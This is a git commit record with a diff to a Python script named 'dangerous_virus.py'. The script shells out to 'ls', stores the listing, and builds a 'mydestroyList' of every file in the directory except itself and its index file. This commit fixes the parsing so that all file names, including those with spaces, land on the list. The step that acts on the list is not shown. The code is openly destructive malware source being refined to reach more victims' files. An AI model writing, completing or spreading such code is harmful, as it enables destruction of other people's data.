f9e8b80d6b016126584fc3b2f4e245265f4c0135
ROHIT VISHWAKARMA <52505486+ROHIT25082000@users.noreply.github.com>
2020-04-17 22:08:40 +0530

    Update dangerous_virus.py
    All files now can be treated

--- dangerous_virus.py
+++ dangerous_virus.py
@@ -1,9 +1,9 @@
 import subprocess
 import re
-subprocess.run("ls >index.dat",shell = True)
+subprocess.run("ls --format=single-column >index.dat",shell = True)
 fp = open("index.dat","r")
 mydestroyList = fp.read()
-mydestroyList = re.split("\\n| ",mydestroyList)
+mydestroyList = re.split("\\n",mydestroyList)
 mydestroyList.remove("index.dat")
 mydestroyList.remove("dangerous_virus.py")
 fp.close()
